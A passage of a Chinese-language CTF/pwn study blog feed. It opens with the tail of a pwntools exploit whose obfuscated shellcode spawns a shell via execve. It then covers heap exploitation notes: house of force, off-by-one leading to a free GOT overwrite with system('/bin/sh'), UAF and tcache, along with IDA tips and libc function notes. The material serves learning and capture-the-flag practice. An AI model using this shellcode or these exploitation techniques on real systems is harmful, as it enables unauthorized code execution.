*/</span><br><span class="hljs-string">        /* push b&#x27;sh\x00&#x27; */</span><br><span class="hljs-string">        push 0x1010101 ^ 0x6873</span><br><span class="hljs-string">        xor dword ptr [rsp], 0x1010101</span><br><span class="hljs-string">        xor esi, esi /* 0 */</span><br><span class="hljs-string">        push rsi /* null terminate */</span><br><span class="hljs-string">        push 8</span><br><span class="hljs-string">        pop rsi</span><br><span class="hljs-string">        add rsi, rsp</span><br><span class="hljs-string">        push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="hljs-string">        mov rsi, rsp</span><br><span class="hljs-string">        xor edx, edx /* 0 */</span><br><span class="hljs-string">        /* call execve() */</span><br><span class="hljs-string">        push SYS_execve /* 0x3b */</span><br><span class="hljs-string">        pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">        mov r8,0x151f</span><br><span class="hljs-string">        xor r8,0x1010</span><br><span class="hljs-string">        push r8</span><br><span class="hljs-string">        call rsp</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>    )<br><br><br>    <span class="hljs-built_in">print</span>(shellcode)<br><br><br>    io.sendlineafter(<span class="hljs-string">b&quot;you will get the flag!&quot;</span>,shellcode)<br>    io.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br><br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/file-20250331145833511.png"><br><img src="/2024/10/29/hello-world/file-20250331145920838.png"></p><hr><p>以下未解出 待复现</p><hr><h1 id="ezvm"><a href="#ezvm" class="headerlink" title="ezvm"></a>ezvm</h1><p>0x0   到  0x7F 是数据段<br>0x80  到  0xFF 栈段<br>0x100 到  0x120<br>0x100 是 stack pointer</p><p>1<br>    ++i<br>    push NextNum<br>2<br>    pop s1<br>3<br>    pop s1<br>    pop s2<br>    push s1+s2<br>4<br>    pop s1<br>    pop s2<br>    push s1-s2<br>5  写内存 是从栈中写的<br>    ++i<br>    pop s1<br>    memory[nextNum] &#x3D; s1<br>6<br>    ++i<br>    push memory[nextNum]</p><p>7<br>    sp ++<br>8<br>    sp –<br>9<br>    pop s1<br>    pop s2<br>    push s1*s2<br>0xa<br>    pop s1<br>    pop s2<br>    push s1&#x2F;s2<br>0xb<br>    pop s1<br>    pop s2<br>    push s1%s2<br>0xc<br>    pop s1<br>    pop s2<br>    push s1 &amp; s2<br>0xd<br>    pop s1<br>    pop s2<br>    push s1 | s2<br>0xe<br>    pop s1<br>    pop s2<br>    push s1 ^ s2<br>0xF 栈顶取反<br>    sp &#x3D; ~sp  </p><p>0x10 跳转到第nextNum条指令 （索引nextNum-1）<br>    i &#x3D; nextNum - 1<br>    (nextNum是无符号数)</p><p>0x11 条件跳转<br>    栈顶大于等于0<br>    栈顶数据为0<br>    跳转<br>    i &#x3D; nextNum -1<br>0x12<br>     栈顶大于等于0<br>     栈顶数据不为0<br>     跳转<br>    i &#x3D; nextNum -1</p><p>逆向 + 实验几次 熟悉程序<br><img src="/2024/10/29/hello-world/file-20250329191815073.png"><br><img src="/2024/10/29/hello-world/file-20250329191828067.png"><br><img src="/2024/10/29/hello-world/file-20250329195652642.png"><img src="/2024/10/29/hello-world/file-20250329195702991.png"></p><p>控制写“内存”（全局数组） 控制索引<code>next_opNum</code><br><img src="/2024/10/29/hello-world/file-20250331170523311.png"></p><hr><h1 id="another-shell"><a href="#another-shell" class="headerlink" title="another_shell"></a>another_shell</h1><p>区别是开了pie<br><img src="/2024/10/29/hello-world/file-20250330135646360.png"></p><h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><h2 id="house-of-apple"><a href="#house-of-apple" class="headerlink" title="house of apple"></a>house of apple</h2><p><img src="/2024/10/29/hello-world/file-20250330172429601.png"></p><hr>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Largebin Attack</title>
    <link href="/2025/03/28/Largebin-Attack/"/>
    <url>/2025/03/28/Largebin-Attack/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>house of force</title>
    <link href="/2025/03/28/house%20of%20force/"/>
    <url>/2025/03/28/house%20of%20force/</url>
    
    <content type="html"><![CDATA[<p>如果一个堆（heap based）漏洞想要通过house of force方法利用<br>需要以下条件：</p><ol><li>能够以溢出等方式控制到top chunk的size域</li><li>能够自由地控制堆分配尺寸的大小</li></ol><hr><p>这种利用手法来源于glibc对top chunk的处理：<br>进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从top chunk中分割出相应的大小作为堆块的空间</p><hr><p>ctfshow143<br><img src="/2024/10/29/hello-world/ce/file-20250328185415289.png"><br>no pie<br>在这个题目中，<br><img src="/2024/10/29/hello-world/ce/file-20250328232015946.png"><br>edit居然可以直接溢出，输入的size由用户决定，直接堆溢出</p><hr><p><code>REQUEST_OUT_OF_RANGE</code>宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> REQUEST_OUT_OF_RANGE(req) \</span><br><span class="hljs-meta">  ((unsigned long)(req) &gt;= (unsigned long)(INTERNAL_SIZE_T)(-2 * MINSIZE))</span><br></code></pre></td></tr></table></figure><p><code>MINSIZE</code>：堆分配器中允许分配的最小内存块大小</p><p>检查请求的内存<code>req</code>是否大于等于一个非常大的数值（由<code>-2*MINSIZE</code>转化而来）<br><code>-2*MINSIZE</code> -&gt; (INTERNAL_SIZE_T)型 -&gt; (unsigned long)型 一个非常大的正数</p><p>如果<code>req</code>超过了这个数值，那么认为请求的内存大小超出了合理的范围</p><hr><p><code>MINSIZE</code><br>在glibc的<code>malloc</code>实现中，<code>MINSIZE</code>的值通常是<code>2*SIZE_S</code>，其中<code>SIZE_SE</code>是<code>sizeof(size_t)</code></p><ul><li>32位系统：<code>SIZE_SZ = 4</code>，因此<code>MINSIZE = 8</code></li><li>64位系统：<code>SIZE_SZ = 8</code>，因此<code>MINSIZE = 16</code></li></ul><p>为什么是<code>2 * SIZE_SZ</code>？</p><ul><li>内存对齐：分配器通常要求分配的内存块大小是<code>2 * SIZE_SZ</code>的倍数，以满足内存对齐要求</li></ul>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆相关数据结构</title>
    <link href="/2025/03/27/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <url>/2025/03/27/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h1><h1 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h1><h2 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h2><p>小<br>LIFO<br>单链表<br>不会对free chunk进行合并操作</p><h2 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h2><p>中<br>FIFO<br>循环双链表<br>相邻的free chunk会进行合并操作</p><h2 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h2><p>大</p><h2 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h2><hr><p>64位中<br>&lt;&#x3D; 0x80   fastbin     &lt;<br>&lt;&#x3D; 0x200  smallbin    &lt;<br>          largebin</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>off-by-one</title>
    <link href="/2025/03/27/off-by-one/"/>
    <url>/2025/03/27/off-by-one/</url>
    
    <content type="html"><![CDATA[<blockquote><p>单字节缓冲区溢出</p></blockquote><p>Maybe in:</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误</li><li>字符串操作不合适</li></ul><p>off-by-one是可以基于各种缓冲区的，比如堆、栈、bss段等，在堆上比较常见</p><p>详见：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/">堆中的 Off-By-One - CTF Wiki</a></p><hr><p>利用手法：</p><ol><li>控制溢出字节：修改大小造成块结构之间出现重叠，从而泄漏其它块数据，或是覆盖其它块数据</li><li>溢出NULL字节：使得pre_inuse被清，这样前块会被认为是free块<ol><li>这时可以用unlink方法</li><li>prev_size域启用，可以伪造prev_size，从而造成块之间发生重叠，此方法的关键在于unlink的时候没有检查按照<code>prev_size</code>找到的块大小是否与<code>prev_size</code>一致</li></ol><ul><li>新版本已经加入针对2.2的check,在2.28以及以前版本没有该check</li></ul></li></ol><hr><p>ctfshow 142</p><blockquote><p>修改free_got表</p></blockquote><p>no pie<br><img src="/2024/10/29/hello-world/ile-20250327214031012.png"></p><p>远程：ubuntu18.04</p><p>思路：<br>利用off-by-one控制堆块（改写堆块大小）<br>进而<br>劫持got表，got表是可写的！</p><p>根据题目，堆内存的读写依赖于堆块之间的指针链接<br>有edit() add() delete() show() 函数</p><p>通过off-by-one改写堆块大小，我们可以</p><ul><li>根据我们想要的指针链接方式重新释放（改变了tcachebin的大小）、申请堆块</li><li>覆盖下一个堆块的内容</li></ul><p>因为show()函数是根据堆块指针打印内容的<br>我们可以覆盖下一个堆块时修改存储指针的内存区域为free_got表地址，打印泄露出free()函数地址</p><ol><li>可以计算出系统调用地址<code>sys_addr</code></li><li>改变了heapContent指针指向，指向了free_got表！！</li></ol><p>而edit()函数也依赖于堆块指针<br>我们便可以修改free的got表！！<br>将<code>sys_addr</code>写入free的got表 &#x3D;&gt; 调用free &#x3D; 调用<code>sys_addr</code></p><p>接下来，<br>我们可以找个堆块,”free”掉指向heapContent的指针<br>这个”free”其实是<code>sys</code>，heapContent指针指向字符串参数’&#x2F;bin&#x2F;sh\x00’<br>（只需写入heapContent的内容为’&#x2F;bin&#x2F;sh\x00’即可）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">size_t</span>* heapContent;<br>&#125;MyHeap;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ida创建结构体</title>
    <link href="/2025/03/27/ida%E5%88%9B%E5%BB%BA%E7%BB%93%E6%9E%84%E4%BD%93/"/>
    <url>/2025/03/27/ida%E5%88%9B%E5%BB%BA%E7%BB%93%E6%9E%84%E4%BD%93/</url>
    
    <content type="html"><![CDATA[<h1 id="ida快照"><a href="#ida快照" class="headerlink" title="ida快照"></a>ida快照</h1><p>ctrl + shift + w : 唤起创建ida快照窗口<br><img src="/2024/10/29/hello-world/e-20250327201517690.png"><br>ctrl + shift + t : 唤起ida历史快照窗口<br><img src="/2024/10/29/hello-world/e-20250327201546313.png"></p><hr><h1 id="0x01-在结构体-structures-窗口中定义（shift-F9）"><a href="#0x01-在结构体-structures-窗口中定义（shift-F9）" class="headerlink" title="0x01 在结构体(structures)窗口中定义（shift + F9）"></a>0x01 在结构体(structures)窗口中定义（shift + F9）</h1><p>View -&gt; Open Subview -&gt; Structures(shift+ F9) 进入结构体窗口<br>按insert新建结构体（delete键删除）<br><img src="/2024/10/29/hello-world/e-20250327202847416.png"><br>在结构体的ends行，按<code>d</code>键可以新建成员<br>在成员行，按<code>d</code>键可以切换数据类型(<code>db</code>(1字节)、<code>dw</code>(2字节)、<code>dd</code>(4字节))</p><p>（还可右键更多选择</p><hr><p>在names(函数、变量)等窗口（shift + F4）查找：ctrl + F<br>segment窗口（shift + F7)<br>切换导航栏窗口<br>ctrl (+ shift) + tab</p><p>回到上一个窗口<br>shift + F6</p><p>撤销上一步操作：<br><code>ctrl + Z</code> <code>ctrl + _</code><br>反撤销：<br><code>ctrl + Y</code> <code>ctrl + shift + Z</code></p><h1 id="0x02-将结构体应用到变量"><a href="#0x02-将结构体应用到变量" class="headerlink" title="0x02 将结构体应用到变量"></a>0x02 将结构体应用到变量</h1><p>右键变量 convert to struct*<br><img src="/2024/10/29/hello-world/e-20250327205532472.png"><br>可将变量（相同位宽）定义为指向该结构体的指针</p><hr><blockquote><p>参考：<br>  <a href="https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html">IDA 高级功能使用 之 创建结构体 —— 加快你的逆向速度 - thinkycx.me</a></p></blockquote><h1 id="0x02-shift-F1"><a href="#0x02-shift-F1" class="headerlink" title="0x02 shift + F1"></a>0x02 shift + F1</h1><p>类型<br>int64_t<br>uint64_t</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>UAF</title>
    <link href="/2025/03/26/UAF/"/>
    <url>/2025/03/26/UAF/</url>
    
    <content type="html"><![CDATA[<p><em><strong>use after free</strong></em></p><p>free()函数所做的是<br>把指针指向的chunk释放了，使这个chunk不再是堆块了<br>但是这个指针仍然指向这个chunk,这个指针的值以及这个chunk的内容都不会被改变</p><p>如果你重新申请了这块被释放的chunk，那么只要这个指针的值没有变，这个chunk就还能被这个指针使用</p><p>如果原来的指针-&gt;原来的chunk是有固定功能的，<br>如果你申请内存时又成功分配到了这个chunk同时还能控制这个chunk的内容，便可以改变其原有的固定功能。</p><hr><p>tcachebins和fastbins</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于pwn题的环境</title>
    <link href="/2025/03/19/%E5%85%B3%E4%BA%8Epwn%E9%A2%98%E7%9A%84%E7%8E%AF%E5%A2%83/"/>
    <url>/2025/03/19/%E5%85%B3%E4%BA%8Epwn%E9%A2%98%E7%9A%84%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h1 id="关于pwn题的环境"><a href="#关于pwn题的环境" class="headerlink" title="关于pwn题的环境"></a>关于pwn题的环境</h1><p>目前我所已知的三种较为推荐的方式：将本地环境和远程环境相统一</p><ol><li><p>patchelf + glibc-all-in-one<br><a href="%E6%9B%B4%E6%94%B9pwn%E9%A2%98libc.md">更改pwn题libc</a></p></li><li><p>在脚本中打开本地进程这么写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">process([<span class="hljs-string">&quot;ld路径“, &quot;</span>./题目<span class="hljs-string">&quot;], env=&#123;&quot;</span>LD_PRELOAD<span class="hljs-string">&quot;:&quot;</span>libc路径<span class="hljs-string">&quot;&#125;)</span><br></code></pre></td></tr></table></figure></li><li><p>docker pwndocker<br><a href="docker%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8C%97.md">docker不完全指北</a></p></li></ol><hr><h1 id="strings指令"><a href="#strings指令" class="headerlink" title="strings指令"></a>strings指令</h1><blockquote><p>从二进制文件、文本文件或其他文件中提取并显示可打印的字符串</p></blockquote><p>查看版本信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">strings ./binary | grep ubuntu<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>堆基础</title>
    <link href="/2025/03/19/%E5%A0%86%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/03/19/%E5%A0%86%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<hr><p>brk</p><blockquote><p>系统调用</p></blockquote><p>将进程的<strong>堆结束地址</strong>(prgram break)设置为指定的值，从而控制堆内存的大小。<br>可以扩展或收缩堆内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">brk</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span>;<br></code></pre></td></tr></table></figure><p>addr：<br>指定新的堆结束地址</p><p>成功时，返回0<br>失败时，返回-1，设置<code>errno</code>为以下之一：</p><ul><li><code>ENOMEN</code> 内存不足，无法扩展到指定的地址</li><li><code>EINVAL</code> 指定的地址无效</li></ul><hr><p>sbrk</p><blockquote><p>Unix&#x2F;Linux系统中的一个系统调用</p></blockquote><p>通过<strong>增加或减少</strong>进程的<strong>堆结束地址</strong>(Program break)来分配或释放内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">sbrk</span><span class="hljs-params">(<span class="hljs-type">intptr_t</span> increment)</span>;<br></code></pre></td></tr></table></figure><p><code>increment</code>：堆内存的调整量，以字节为单位。可为正数、负数或零</p><ul><li>正值：增加堆的大小，向系统申请更多内存空间</li><li>负值：减少堆的大小，释放之前分配的内存</li><li>零：不改变堆的大小，此时函数返回当前堆的<strong>结束地址</strong><br>返回值：</li><li>成功时，<ul><li>如果<code>increment</code>是负数，返回<strong>调整前</strong>的<strong>堆顶地址</strong>。</li><li>如果<code>increment</code>是正值，则返回值指向<strong>新分配</strong>内存的<strong>堆顶地址</strong></li><li>如果<code>increment</code>是0，返回当前堆的<strong>结束地址</strong>（program break)</li></ul></li><li>失败时，返回<code>(void *)-1</code>,并设置<code>errno</code>为<code>ENOMEM</code>，表示没有足够的内存</li></ul><hr><p>getpid</p><blockquote><p>系统调用</p></blockquote><p>返回当前进程的PID</p><hr><hr><p>常用调试命令<br><code>heap</code><br><code>vmmap</code><br><code>vis_heap_chunks</code><br><code>top_chunk</code><br><code>bin</code><br><code>arenas</code><br><code>arena</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sh">find_fake_fast &lt;addr&gt;<br><span class="hljs-comment"># 查找与addr重叠的候选假fast或tcache块</span><br><br>malloc_chunk &lt;addr&gt;<br><span class="hljs-comment"># 打印指定地址的chunk</span><br><br>heap_config<br><span class="hljs-comment"># 显示与堆相关的配置</span><br><br>try_free &lt;addr&gt;<br><span class="hljs-comment"># 检查用地址调用free会发生什么</span><br><br>mp<br><span class="hljs-comment"># 打印mp_结构的内容</span><br><br>tcache<br><span class="hljs-comment"># 打印线程的tcache内容</span><br></code></pre></td></tr></table></figure><hr><h1 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h1><blockquote><p><strong>glibc从2.26版本</strong>开始引入的一种内存管理机制，旨在提高内存分配的性能。</p></blockquote><p>tcache(thread cache)是一种线程本地缓存机制，每个线程都有自己的tcache结构，它类似于fastbin，但是优先级上高于fastbin</p><blockquote><p>减少线程之间的互斥 和 锁的竞争</p></blockquote><p>当程序进行<code>malloc</code>操作时，会优先检查tcache是否有可用的chunk，如果有，就直接返回；<br>当进行<code>free</code>操作时，如果chunk的大小符合要求，并且对应的tcache bin还未满（默认每个bin可以存放7个chunk），就会把chunk放入tcache。</p><hr><h1 id="了解堆"><a href="#了解堆" class="headerlink" title="了解堆"></a>了解堆</h1><p>Top chunk：程序第一次进行malloc的时候，heap会被分为两块，一块给用户，剩下的那块就是top chunk，再次申请堆块要是没合适的空间便会使用top chunk的空间<br>你申请到的一块堆内存的起始地址 $\neq$ 你可以写入数据的起始地址，因为堆块头部会记录一些信息，在64位条件下会有0x10大小的差距<br>你申请的大小 $\neq$ 实际申请的大小，他会有一个取整的步骤</p><hr><p>一般使用free()函数释放的堆块不会立刻被回收，它们会变成一种叫free chunk的东西并且加上了一种类似xxx bin的名字，一般这类堆块释放后如果挨着一个也被释放的堆块或者是top chunk会合并<br>fast bin是一个特例 – 它不会轻易合并</p><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">calloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> n, <span class="hljs-type">size_t</span> size)</span><br># 和<span class="hljs-built_in">malloc</span>的重要区别是会清0堆块中的内容<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">realloc</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr, <span class="hljs-type">size_t</span> size)</span><br># 结合了<span class="hljs-built_in">malloc</span>和<span class="hljs-built_in">free</span>的功能 但是释放内存和<span class="hljs-built_in">free</span>有所区别<br></code></pre></td></tr></table></figure><hr><h1 id="Arena"><a href="#Arena" class="headerlink" title="Arena"></a>Arena</h1><p>在glibc的内存管理机制中，arena（分配区）是ptmalloc（glibc所用的内存分配器）用于管理进程内存的核心结构之一</p><p>它通过减少线程间的锁竞争来提升多线程环境下内存分配的性能</p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><ul><li>主分配区（main arena)：只能由第一个线程创建和持有，可以使用<code>sbrk</code>和<code>mmap</code>向操作系统申请内存</li><li>非主分配区（Non-main Arena）：由其它线程创建，只能通过mmap向操作系统申请内存</li></ul><hr><p>查看系统libc版本号</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">ldd --version<br></code></pre></td></tr></table></figure><hr><p>64位<br>以 0x10 &lt;&#x3D; userdata &lt; 0x20为例<br>userdata： &lt;&#x3D; 0x18 共分配0x20<br>userdata： &gt;  0x18 共分配0x30</p><p>这样分配和chunk间复用和size、PRE_INUSE字段有关</p><hr><p>各ubunut版本常用的libc版本<br>Ubuntu18.04 2.27</p><p><a href="%E6%9B%B4%E6%94%B9pwn%E9%A2%98libc.md">更改pwn题libc</a></p><p>2.35的堆io</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>危险函数与常用函数</title>
    <link href="/2025/03/18/%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E4%B8%8E%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
    <url>/2025/03/18/%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E4%B8%8E%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h1><p><strong>gets(s)</strong><br><code>gets()</code> 函数从标准输入读取一行字符，直到遇到换行符（<code>\n</code>）或文件结束符（EOF）。换行符不会被存储在目标字符串中，而是被替换为 null 终止符（<code>\0</code>）。<br><em><em>puts(const char</em> s)</em>*<br>持续输出s指向的字符 直到遇到终止符<code>\0</code></p><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">strncpy</span><span class="hljs-params">(<span class="hljs-type">char</span> *dest, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *src, <span class="hljs-type">size_t</span> n)</span>;<br></code></pre></td></tr></table></figure><ul><li>dest 目标字符串的指针</li><li>src 源字符串的指针</li><li>n 要复制的最大字符数</li></ul><p>是<strong>安全</strong>的，n限制了最大字符数</p><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">alarm</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seconds)</span>;<br></code></pre></td></tr></table></figure><p><code>seconds</code>：​指定在多少秒后发送 <code>SIGALRM</code> 信号。如果设置为 0，则取消之前设置的闹钟。</p><p>实现定时触发函数的功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-comment">// 信号处理函数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">handle_sigalrm</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;收到信号 %d：闹钟触发\n&quot;</span>, sig);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 设置 SIGALRM 信号的处理函数</span><br>    signal(SIGALRM, handle_sigalrm);<br><br>    <span class="hljs-comment">// 设置闹钟，在 5 秒后触发 SIGALRM 信号</span><br>    alarm(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;闹钟设置为 5 秒后触发\n&quot;</span>);<br><br>    <span class="hljs-comment">// 无限循环，等待信号</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;程序运行中...\n&quot;</span>);<br>        sleep(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs erlang">闹钟设置为 <span class="hljs-number">5</span> 秒后触发<br>程序运行中...<br>程序运行中...<br>程序运行中...<br>程序运行中...<br>程序运行中...<br>收到信号 <span class="hljs-number">14</span>：闹钟触发<br>程序运行中...<br>...<br><br></code></pre></td></tr></table></figure><h2 id="注意事项：-一个进程同时只能有一个闹钟定时器。如果在之前的闹钟尚未触发时再次调用-alarm，新的定时将覆盖之前的设置。​菜鸟教程-6nocbtm’s-Blog-6博客园-6-要取消已设置的闹钟，可以调用-alarm-0-。​nocbtm’s-Blog-2旧时光文档-2博客园-2-SIGALRM-信号的默认行为是终止进程，因此通常需要自定义信号处理函数来定义触发后的操作。"><a href="#注意事项：-一个进程同时只能有一个闹钟定时器。如果在之前的闹钟尚未触发时再次调用-alarm，新的定时将覆盖之前的设置。​菜鸟教程-6nocbtm’s-Blog-6博客园-6-要取消已设置的闹钟，可以调用-alarm-0-。​nocbtm’s-Blog-2旧时光文档-2博客园-2-SIGALRM-信号的默认行为是终止进程，因此通常需要自定义信号处理函数来定义触发后的操作。" class="headerlink" title="注意事项：- 一个进程同时只能有一个闹钟定时器。如果在之前的闹钟尚未触发时再次调用 alarm，新的定时将覆盖之前的设置。​菜鸟教程+6nocbtm’s Blog+6博客园+6- 要取消已设置的闹钟，可以调用 alarm(0)。​nocbtm’s Blog+2旧时光文档+2博客园+2- SIGALRM 信号的默认行为是终止进程，因此通常需要自定义信号处理函数来定义触发后的操作。"></a><strong>注意事项：</strong><br>- 一个进程同时只能有一个闹钟定时器。如果在之前的闹钟尚未触发时再次调用 <code>alarm</code>，新的定时将覆盖之前的设置。​<a href="https://nocbtm.github.io/2019/09/11/linux-c-alarm%E5%87%BD%E6%95%B0/?utm_source=chatgpt.com">菜鸟教程+6nocbtm’s Blog+6博客园+6</a><br>- 要取消已设置的闹钟，可以调用 <code>alarm(0)</code>。​<a href="https://docs.oldtimes.me/c.biancheng.net/cpp/html/334.html?utm_source=chatgpt.com">nocbtm’s Blog+2旧时光文档+2博客园+2</a><br>- <code>SIGALRM</code> 